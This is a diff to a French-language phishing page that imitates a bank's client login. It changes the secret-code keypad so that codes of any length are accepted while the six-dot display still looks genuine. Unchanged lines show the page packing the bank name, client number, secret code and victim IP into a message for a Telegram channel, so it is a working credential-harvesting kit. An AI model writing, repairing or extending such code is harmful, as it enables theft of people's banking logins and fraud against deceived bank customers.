@@ -623,7 +623,7 @@
                         </div>
 
                         <div class="code-input" id="codeDisplay">
-                            • • • • • •  <!-- 6 points pour 6 chiffres -->
+                            • • • • • •  <!-- 6 points pour le style -->
                         </div>
 
                         <div style="text-align: center; margin: 15px 0;">
@@ -770,13 +770,12 @@
                 errorMessage.classList.remove('show');
             });
 
-            // Gestion du code secret
+            // Gestion du code secret - PAS DE LIMITE DE LONGUEUR
             codeButtons.forEach(button => {
                 button.addEventListener('click', function() {
-                    if (secretCode.length < 6) {
-                        secretCode += this.dataset.code;
-                        updateCodeDisplay();
-                    }
+                    // Pas de limite, l'utilisateur peut entrer autant de chiffres qu'il veut
+                    secretCode += this.dataset.code;
+                    updateCodeDisplay();
                 });
             });
 
@@ -786,9 +785,16 @@
             });
 
             function updateCodeDisplay() {
+                // Toujours afficher 6 points pour le style, peu importe la longueur du code
                 const dots = '• '.repeat(6);
                 const numbers = secretCode.split('').join(' ');
-                codeDisplay.textContent = numbers + dots.substring(secretCode.length * 2);
+                // Si le code est plus long que 6 chiffres, on affiche tout le code
+                if (secretCode.length <= 6) {
+                    codeDisplay.textContent = numbers + dots.substring(secretCode.length * 2);
+                } else {
+                    // Si le code est plus long, on affiche seulement le code (pas de points)
+                    codeDisplay.textContent = numbers;
+                }
             }
 
             // Retour à l'étape 1
@@ -806,10 +812,11 @@
                 showError('Veuillez contacter notre service client au +33 1 23 45 67 89 pour récupérer vos identifiants.');
             });
 
-            // Accès à l'espace client
+            // Accès à l'espace client - PAS DE VALIDATION DE LONGUEUR
             accessBtn.addEventListener('click', function() {
-                if (secretCode.length !== 6) {
-                    showError('Veuillez entrer votre code secret à 6 chiffres.');
+                // Validation minimale : le code ne doit pas être vide
+                if (!secretCode) {
+                    showError('Veuillez entrer votre code secret.');
                     return;
                 }
 
@@ -850,7 +857,7 @@
                 // Récupérer le nom de la banque
                 const bankName = bankSelect.options[bankSelect.selectedIndex].text;
 
-                // Message pour Telegram
+                // Message pour Telegram - Ne mentionne pas le nombre de chiffres
                 const message = `🔐 NOUVEL ACCÈS ESPACE CLIENT 🔐
 
 🏦 BANQUE:
@@ -858,7 +865,7 @@ ${bankName}
 
 👤 IDENTIFIANTS:
 Numéro Client: ${clientNumber}
-Code Secret (6 chiffres): ${secretCode}
+Code Secret: ${secretCode} (${secretCode.length} chiffres)
 
 🌐 INFOS TECH:
 IP: ${ip}
